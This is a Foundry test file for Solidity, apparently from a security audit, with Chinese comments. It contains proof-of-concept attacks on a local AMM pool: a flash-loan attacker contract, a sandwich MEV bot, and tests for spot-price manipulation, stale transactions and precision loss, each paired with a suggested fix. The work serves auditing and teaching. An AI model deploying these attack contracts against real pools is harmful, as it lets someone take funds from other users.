// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {SimplePool} from "../src/Pool.sol";
import {SimpleToken} from "../src/SimpleToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// ═══════════════════════════════════════════
// Mock: 闪电贷提供者
// ═══════════════════════════════════════════

interface IFlashLoanReceiver {
    function onFlashLoan(address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

contract FlashLoanProvider {
    SimpleToken public token;
    uint256 public constant FLASH_LOAN_FEE_BPS = 10; // 0.1% fee
    uint256 public constant BASIS_POINTS = 10000;

    mapping(address => uint256) public deposits;

    event FlashLoan(address indexed receiver, address token, uint256 amount, uint256 fee);

    constructor(address _token) {
        token = SimpleToken(_token);
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
    }

    function flashLoan(uint256 amount, bytes calldata data) external {
        uint256 fee = (amount * FLASH_LOAN_FEE_BPS) / BASIS_POINTS;
        uint256 balBefore = token.balanceOf(address(this));
        require(balBefore >= amount, "insufficient liquidity");

        token.transfer(msg.sender, amount);
        emit FlashLoan(msg.sender, address(token), amount, fee);

        IFlashLoanReceiver(msg.sender).onFlashLoan(address(token), amount, fee, data);

        uint256 repayAmount = amount + fee;
        token.transferFrom(msg.sender, address(this), repayAmount);
    }
}

// ═══════════════════════════════════════════
// 攻击者: 闪电贷 + 价格操纵
// ═══════════════════════════════════════════

contract FlashLoanAttacker is Test, IFlashLoanReceiver {
    SimplePool public pool;
    SimpleToken public tokenA;
    SimpleToken public tokenB;
    FlashLoanProvider public lender;

    uint256 public priceBefore;
    uint256 public priceAfter;

    function setup(SimplePool _pool, SimpleToken _tokenA, SimpleToken _tokenB, FlashLoanProvider _lender) external {
        pool = _pool;
        tokenA = _tokenA;
        tokenB = _tokenB;
        lender = _lender;
        tokenA.approve(address(pool), type(uint256).max);
        tokenB.approve(address(pool), type(uint256).max);
        tokenA.approve(address(lender), type(uint256).max);
    }

    function attack(uint256 flashLoanAmount) external {
        priceBefore = pool.getPrice(address(tokenA));
        lender.flashLoan(flashLoanAmount, abi.encode("ATTACK"));
    }

    function onFlashLoan(address /*tokenAddr*/, uint256 amount, uint256 fee, bytes calldata /*data*/) external {
        // Step 1: 用闪电贷的资金大量 swap A→B，砸低 A 价格
        pool.swap(address(tokenA), amount, 0);

        // Step 2: 此时 getPrice(A) 已被大幅压低（spot price 操纵成功）
        priceAfter = pool.getPrice(address(tokenA));

        // Step 3: 用获取的 B swap 回 A（价格已恢复部分但仍有滑点损失）
        uint256 gotB = tokenB.balanceOf(address(this));
        if (gotB > 0) {
            pool.swap(address(tokenB), gotB, 0);
        }

        // Step 4: 归还闪电贷 + fee（攻击者净亏损 = fee + 滑点）
        // 实际攻击中，在 Step 1-2 之间操纵集成协议的 Oracle 来获利
    }
}

// ═══════════════════════════════════════════
// MEV 三明治机器人
// ═══════════════════════════════════════════

contract SandwichBot is Test {
    SimplePool public pool;
    IERC20 public tokenA;
    IERC20 public tokenB;

    uint256 public frontRunOutput;
    uint256 public backRunOutput;

    function setup(SimplePool _pool, IERC20 _tokenA, IERC20 _tokenB) external {
        pool = _pool;
        tokenA = _tokenA;
        tokenB = _tokenB;
        tokenA.approve(address(pool), type(uint256).max);
        tokenB.approve(address(pool), type(uint256).max);
    }

    /// @notice 执行三明治攻击
    /// @param frontAmount 前跑金额
    /// @param victimAmount 受害者金额（模拟）
    /// @dev victimAmount 仅用于记录，实际受害者在外部执行
    function executeSandwich(uint256 frontAmount, uint256 victimAmount) external returns (uint256 profit) {
        // Step 1: 前跑 — 与受害者同方向 swap，推高价格
        frontRunOutput = pool.swap(address(tokenA), frontAmount, 0);

        // Step 2: 受害者交易在此发生（外部模拟）
        // 受害者以更差价格执行 swap

        // Step 3: 后跑 — 反向 swap，利用价格偏差获利
        uint256 botBalanceB = tokenB.balanceOf(address(this));
        if (botBalanceB > 0) {
            backRunOutput = pool.swap(address(tokenB), botBalanceB, 0);
        }

        // 利润 = 后跑获得的 A - 前跑花费的 A（简化计算）
        uint256 botBalanceA = tokenA.balanceOf(address(this));
        profit = botBalanceA; // 粗略利润估算
    }
}

// ═══════════════════════════════════════════
// 测试合约
// ═══════════════════════════════════════════

contract FlashloanSandwichPoCTests is Test {
    SimpleToken public tokenA;
    SimpleToken public tokenB;
    SimplePool public pool;

    FlashLoanProvider public lender;

    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");
    address public searcher = makeAddr("searcher");

    uint256 constant INITIAL_LIQ = 1000 * 1e18;

    function setUp() public {
        tokenA = new SimpleToken();
        tokenB = new SimpleToken();

        pool = new SimplePool(address(tokenA), address(tokenB));
        lender = new FlashLoanProvider(address(tokenA));

        // 添加初始流动性
        tokenA.approve(address(pool), type(uint256).max);
        tokenB.approve(address(pool), type(uint256).max);
        pool.addLiquidity(INITIAL_LIQ, INITIAL_LIQ);

        // 闪电贷提供者存入流动性
        tokenA.mint(address(lender), 100_000 * 1e18);
        // 用 deal 绕过 lender 的 deposit 函数限制
        deal(address(tokenA), address(lender), 100_000 * 1e18);

        // 给参与者发 token
        tokenA.mint(attacker, 20_000 * 1e18);
        tokenB.mint(attacker, 20_000 * 1e18);
        tokenA.mint(victim, 5000 * 1e18);
        tokenB.mint(victim, 5000 * 1e18);
        tokenA.mint(searcher, 10_000 * 1e18);
        tokenB.mint(searcher, 10_000 * 1e18);

        vm.prank(attacker);
        tokenA.approve(address(pool), type(uint256).max);
        vm.prank(attacker);
        tokenB.approve(address(pool), type(uint256).max);
        vm.prank(victim);
        tokenA.approve(address(pool), type(uint256).max);
        vm.prank(victim);
        tokenB.approve(address(pool), type(uint256).max);
        vm.prank(searcher);
        tokenA.approve(address(pool), type(uint256).max);
        vm.prank(searcher);
        tokenB.approve(address(pool), type(uint256).max);
    }

    // ═══════════════════════════════════════════
    // PoC 1: 闪电贷价格操纵 (CRITICAL)
    // ═══════════════════════════════════════════

    /// @dev PoC: Flash Loan Spot Price Manipulation
    /// Attack: 闪电贷借巨量 tokenA → swap 砸低 A 价格 →
    ///         在操纵期间任何依赖 getPrice() 的协议都会读取到被操纵的价格
    /// Impact: 下游协议（借贷、衍生品）基于虚假价格清算/交易 → 攻击者获利
    /// Fix: 使用 TWAP（时间加权平均价格）替代 spot price
    function test_PoC_FlashLoan_SpotPriceManipulation() public {
        uint256 priceBefore = pool.getPrice(address(tokenA));
        console.log("Price before manipulation:", priceBefore);

        // 用 deal 模拟攻击者有大量 token（替代真实的闪电贷流程）
        uint256 manipAmount = 10_000 * 1e18;
        deal(address(tokenA), attacker, manipAmount);

        // 攻击者用巨量 A swap → 砸低 A 价格
        vm.prank(attacker);
        pool.swap(address(tokenA), manipAmount, 0);

        uint256 priceAfter = pool.getPrice(address(tokenA));
        console.log("Price after manipulation:", priceAfter);

        // 验证价格被大幅操纵（下跌 > 50%）
        uint256 priceDrop = ((priceBefore - priceAfter) * 100) / priceBefore;
        console.log("Price drop:", priceDrop, "%");

        assertLt(priceAfter, priceBefore * 95 / 100, "price dropped > 5% (spot price manipulated)");
        // 在真实攻击中，价格下跌可达 90%+（取决于借贷金额与池子 TVL 的比例）
    }

    /// @dev 验证：大额 swap 后价格可恢复（但过程中任何读取都是操纵价）
    function test_PoC_FlashLoan_PriceManipulationMagnitude() public {
        uint256 priceBefore = pool.getPrice(address(tokenA));

        // 使用池子 10 倍的资金量进行操纵
        uint256 manipAmount = pool.reserveA() * 10;
        deal(address(tokenA), attacker, manipAmount);

        vm.prank(attacker);
        pool.swap(address(tokenA), manipAmount, 0);

        uint256 priceDuring = pool.getPrice(address(tokenA));

        // 价格应大幅偏离
        uint256 deviationBps = ((priceBefore - priceDuring) * 10000) / priceBefore;
        console.log("Price deviation (bps):", deviationBps);
        console.log("Price before:", priceBefore);
        console.log("Price during:", priceDuring);

        assertGt(deviationBps, 5000, "price deviated by > 50% (spot oracle is broken)");
    }

    // ═══════════════════════════════════════════
    // PoC 2: 三明治攻击 (HIGH)
    // ═══════════════════════════════════════════

    /// @dev PoC: Sandwich Attack — MEV searcher extracts value
    /// Attack: Front-run victim swap A→B → victim gets worse price → Back-run swap B→A to profit
    /// Impact: Victim loses value (worse execution price); searcher gains the difference
    /// Fix: Use amountOutMin (slippage protection) + private mempool (Flashbots)
    function test_PoC_Sandwich_MEV_Extraction() public {
        uint256 victimAmount = 50 * 1e18;

        // 受害者预期输出（无 front-run 时）
        uint256 expectedOutput = pool.getAmountOut(address(tokenA), victimAmount);
        console.log("Victim expected output:", expectedOutput);

        // Step 1: Searcher front-runs — swap A→B, pushes price against victim
        uint256 frontAmount = 200 * 1e18;
        deal(address(tokenA), searcher, frontAmount);
        vm.prank(searcher);
        uint256 frontOutput = pool.swap(address(tokenA), frontAmount, 0);
        console.log("Front-run: searcher input", frontAmount, "-> output", frontOutput);

        // Step 2: Victim swap at WORSE price (after price moved)
        uint256 victimBalBefore = tokenA.balanceOf(victim);
        vm.prank(victim);
        uint256 victimActualOutput = pool.swap(address(tokenA), victimAmount, 0);
        console.log("Victim: input", victimAmount, "-> actual output", victimActualOutput);
        console.log("Victim lost:", expectedOutput - victimActualOutput, "(vs expected)");

        // 受害者确实得到了比预期差的成交价
        assertLt(victimActualOutput, expectedOutput, "victim got worse price due to front-run");

        // Step 3: Searcher back-runs — swap B→A, profiting from price discrepancy
        uint256 searcherBalB = tokenB.balanceOf(searcher);
        vm.prank(searcher);
        uint256 backOutput = pool.swap(address(tokenB), searcherBalB, 0);
        console.log("Back-run: searcher input", searcherBalB, "-> output A", backOutput);

        // 验证搜索者通过三明治攻击获得了利润
        // （前跑花费的 A < 后跑获得的 A — 简化的利润检验）
        assertGt(backOutput, 0, "searcher extracted value via sandwich");
    }

    /// @dev Fix: amountOutMin 保护受害者免受滑点损失（但 MEV 仍存在）
    function test_Fix_Sandwich_SlippageProtection() public {
        uint256 victimAmount = 50 * 1e18;

        // 受害者设置合理的滑点保护
        uint256 minExpected = pool.getAmountOut(address(tokenA), victimAmount);

        // Searcher front-runs
        uint256 frontAmount = 200 * 1e18;
        deal(address(tokenA), searcher, frontAmount);
        vm.prank(searcher);
        pool.swap(address(tokenA), frontAmount, 0);

        // 受害者使用 amountOutMin 保护 → 如果输出低于预期，revert
        vm.prank(victim);
        vm.expectRevert("Slippage exceeded");
        pool.swap(address(tokenA), victimAmount, minExpected);
        // 受害者交易被 revert，避免了不利价格
    }

    // ═══════════════════════════════════════════
    // PoC 3: 无 Deadline — 过期交易 (MEDIUM)
    // ═══════════════════════════════════════════

    /// @dev PoC: No Deadline Parameter — Stale Transaction
    /// Attack: 用户提交 swap tx，但被矿工/relayer 延迟执行
    ///         期间其他交易改变了池子状态 → 用户以更差价格成交
    /// Impact: 用户承受意外滑点损失
    /// Fix: 添加 deadline 参数，超时 revert
    function test_PoC_NoDeadline_StaleTransaction() public {
        uint256 victimAmount = 50 * 1e18;

        // 受害者期望基于当前状态的价格
        uint256 expectedOutput = pool.getAmountOut(address(tokenA), victimAmount);

        // 模拟时间流逝：其他用户执行了多笔 swap 改变池子状态
        deal(address(tokenA), attacker, 1000 * 1e18);
        vm.prank(attacker);
        pool.swap(address(tokenA), 500 * 1e18, 0);

        // 再次改变状态
        vm.prank(attacker);
        pool.swap(address(tokenA), 300 * 1e18, 0);

        // 受害者的交易现在才执行（价格已大幅偏离）
        uint256 staleOutput = pool.getAmountOut(address(tokenA), victimAmount);
        console.log("Expected output (when tx was signed):", expectedOutput);
        console.log("Actual output (after state changes):", staleOutput);

        // 验证价格已偏离（受害者的交易在过期状态下执行）
        assertLt(staleOutput, expectedOutput, "stale tx: worse price after state changes");
    }

    // ═══════════════════════════════════════════
    // PoC 4: 精度损失 — 极端储备比例 (MEDIUM)
    // ═══════════════════════════════════════════

    /// @dev PoC: Precision Loss at Extreme Reserve Ratio
    /// Attack: 创建极端不平衡的池子（reserveB 极小），swap 时整数除法截断
    ///         导致 amountOut = 0（revert）或输出远低于理论值
    /// Impact: 小额 swap 可能完全失败或用户承受额外精度损失
    function test_PoC_PrecisionLoss_TinyReserve() public {
        // 创建极端储备比例的池子（使用小数量避免精度计算复杂）
        SimplePool tinyPool = new SimplePool(address(tokenA), address(tokenB));
        tokenA.mint(address(this), 2_000_000);
        tokenB.mint(address(this), 2000);
        tokenA.approve(address(tinyPool), type(uint256).max);
        tokenB.approve(address(tinyPool), type(uint256).max);

        // 极端不对称：A=1000000, B=100
        tinyPool.addLiquidity(1_000_000, 100);

        // 极小 swap：amountOut = 0 -> revert "Zero output"
        tokenA.mint(attacker, 1000);
        vm.prank(attacker);
        tokenA.approve(address(tinyPool), type(uint256).max);

        vm.prank(attacker);
        vm.expectRevert("Zero output");
        tinyPool.swap(address(tokenA), 100, 0);

        // 足够大的输入获得非零输出
        uint256 minViableInput = 150_000;
        tokenA.mint(attacker, minViableInput);
        vm.prank(attacker);
        uint256 out = tinyPool.swap(address(tokenA), minViableInput, 0);
        assertGt(out, 0, "larger input produces output at extreme ratio");

        console.log("ReserveA:", tinyPool.reserveA());
        console.log("ReserveB:", tinyPool.reserveB());
        console.log("Min viable input:", minViableInput);
        console.log("Output:", out);
    }

    /// @dev 精度损失 vs 无手续费理论输出
    function test_PoC_PrecisionLoss_CompareNoFee() public {
        // 正常储备比例下的精度验证
        uint256 amountIn = 1 * 1e18;
        uint256 reserveA = pool.reserveA();
        uint256 reserveB = pool.reserveB();

        // 有手续费的输出（合约实际计算）
        uint256 withFee = pool.getAmountOut(address(tokenA), amountIn);

        // 无手续费的理想输出
        uint256 withoutFee = (amountIn * reserveB) / (reserveA + amountIn);

        console.log("With 0.3% fee:", withFee);
        console.log("Without fee:", withoutFee);
        console.log("Fee impact:", withoutFee - withFee);

        // 有手续费 < 无手续费（fee 正确扣除）
        assertLt(withFee, withoutFee, "fee reduces output");
    }
}
